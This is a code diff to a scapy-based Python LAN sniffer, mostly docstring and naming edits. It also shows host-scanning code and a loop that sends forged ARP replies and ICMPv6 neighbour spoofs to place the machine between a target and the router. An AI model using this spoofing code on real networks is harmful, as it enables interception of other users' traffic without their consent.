@@ -15,9 +15,8 @@ from monitor import attack
 class Sniffer:
     def __init__(self, iface: str = conf.iface):
         """
-        LAN Network sniffer using ARP spoofing
-        :param iface: LAN interface
-        :param spoof_interval: interval of ARP message
+        LAN Network Sniffer
+        :param iface: network interface
         """
         self.started = False
 
@@ -69,13 +68,13 @@ class Sniffer:
         print("Router MAC          : %s" % self.router_mac)
 
         self.sniffer = None
-        self.respoof_mac = 'aa:bb:cc:dd:ee:ff'
+        self._respoof_mac = 'aa:bb:cc:dd:ee:ff'
+        self._ipv6_added = False
 
     def scan(self, timeout=3) -> dict:
         """
-        Scan LAN, discover sniffable hosts
-        :param net: network address in IP cidr
-        :param timeout: timeout for ARP response
+        IPv4 LAN scanning, discover sniffable hosts
+        :param timeout: timeout for ARP and ICMP response
         """
         # ARP request broadcast
         for net in self.net:
@@ -101,27 +100,15 @@ class Sniffer:
 
     def scan6(self, timeout=3):
         """
-        Scan LAN, discover sniffable hosts
-        :param net6: network address in IPv6 cidr
+        IPv6 LAN scanning, discover sniffable hosts
         :param timeout: timeout for ICMPv6 response
         """
-        # ICMP broadcast
-        # for net6 in self.net6:
-        #     multicast_dst = str(ipaddress.IPv6Network(
-        #         int(ipaddress.IPv6Network(net6).hostmask) + int(ipaddress.IPv6Address(net6.split('/')[0]))))
-        #     req = inet6.IPv6(dst=multicast_dst) / inet6.ICMPv6EchoRequest()
-        #     send(req, verbose=False, iface=self.iface)
-        #     res_list = sniff(timeout=timeout, iface=self.iface)
-        #     for res in res_list:
-        #         if res.haslayer(inet6.ICMPv6EchoReply) and res[inet6.IPv6].src not in self.ip6 and res[
-        #             l2.Ether].src != self.mac:
-        #             self.rarp_table[res[l2.Ether].src].add(res[inet6.IPv6].src)
         req = inet6.IPv6(dst='ff02::1') / inet6.ICMPv6EchoRequest()
         send(req, verbose=False, iface=self.iface)
         res_list = sniff(timeout=timeout, iface=self.iface)
         for res in res_list:
-            if res.haslayer(inet6.ICMPv6EchoReply) and res[inet6.IPv6].src not in self.ip6 and res[
-                l2.Ether].src != self.mac:
+            if (res.haslayer(inet6.ICMPv6EchoReply) or res.haslayer(inet6.ICMPv6NDOptDstLLAddr)) \
+                    and res[inet6.IPv6].src not in self.ip6 and res[l2.Ether].src != self.mac:
                 for net6 in self.net6:  # it's so tedious to convert ip address and network format from one to another
                     self.rarp_table6[res[l2.Ether].src].add(str(ipaddress.IPv6Address((int(
                         ipaddress.IPv6Address(res[inet6.IPv6].src)) & 0xFFFFFFFFFFFFFFFF) + int(
@@ -132,9 +119,8 @@ class Sniffer:
 
     def add(self, ip: str):
         """
-
-        :param ip:
-        :return:
+        Add an IPv4 address to target
+        :param ip: IPv4 address
         """
         mac = l2.getmacbyip(ip)
         if mac is not None:
@@ -142,9 +128,8 @@ class Sniffer:
 
     def add6(self, ip6: str):
         """
-
-        :param ip6:
-        :return:
+        Add an IPv6 address to target
+        :param ip6: IPv6 address
         """
         mac = inet6.getmacbyip6(ip6)
         if mac is not None:
@@ -152,10 +137,8 @@ class Sniffer:
 
     def set(self, target_mac: str):
         """
-
-        :param target_mac:
-        :param router_mac:
-        :return:
+        Set a target from scan results
+        :param target_mac: target's mac
         """
         self.target_mac = target_mac
         self.target_ip = self.rarp_table.get(target_mac, set())
@@ -165,7 +148,7 @@ class Sniffer:
         """
         Start sniffing
         :param on_recv: a callback function when receiving a packet
-        :param spoof_interval:
+        :param spoof_interval: time interval between sending two spoofing packets
         """
         self.sniffer = AsyncSniffer(lfilter=self._filter, iface=self.iface, prn=on_recv)
         self.spoof_interval = spoof_interval
@@ -177,6 +160,9 @@ class Sniffer:
         print("Sniffing started")
 
     def stop(self):
+        """
+        Stop sniffing
+        """
         self.started = False
         if self.sniffer is not None:
             self.sniffer.stop()
@@ -188,11 +174,11 @@ class Sniffer:
         ARP and ICMPv6 spoof router
         """
         while self.started:
-            mac = self.respoof_mac if attack.arp_ban else self.mac  # just a random unexisting mac
+            mac = self._respoof_mac if attack.arp_ban else self.mac
             # ARP spoofing
             for target_ip in self.target_ip:
                 for router_ip in self.router_ip:
-                    p = l2.Ether(src=mac, dst=self.router_mac) / \
+                    p = l2.Ether(dst=self.router_mac) / \
                         l2.ARP(op=2, psrc=target_ip, pdst=router_ip, hwsrc=mac)
                     sendp(p, verbose=False, iface=self.iface)
             # ICMPv6 neighbour spoofing
@@ -234,16 +220,16 @@ class Sniffer:
         if p[l2.Ether].type == 2048:
             src = p[inet.IP].src
             dst = p[inet.IP].dst
-            return not ipaddress.IPv4Address(src).is_multicast \
-                   and not ipaddress.IPv4Address(dst).is_multicast \
-                   and src not in self.ip | self.router_ip \
-                   and dst not in self.ip | self.router_ip
+            return not ipaddress.IPv4Address(dst).is_multicast \
+                   and src not in self.ip and dst not in self.ip
         elif p[l2.Ether].type == 34525:
             src = p[inet6.IPv6].src
             dst = p[inet6.IPv6].dst
-            return not p.haslayer(inet6.ICMPv6ND_NA) \
-                   and not ipaddress.IPv6Address(src).is_multicast \
-                   and not ipaddress.IPv6Address(dst).is_multicast \
-                   and src not in self.ip6 | self.router_ip6 \
-                   and dst not in self.ip6 | self.router_ip6
+            if not p.haslayer(inet6.ICMPv6ND_NA) \
+                    and not ipaddress.IPv6Address(dst).is_multicast \
+                    and src not in self.ip6 and dst not in self.ip6:
+                if not self._ipv6_added:
+                    self.target_ip6.add(src)
+                    self._ipv6_added = True
+                return True
         return False
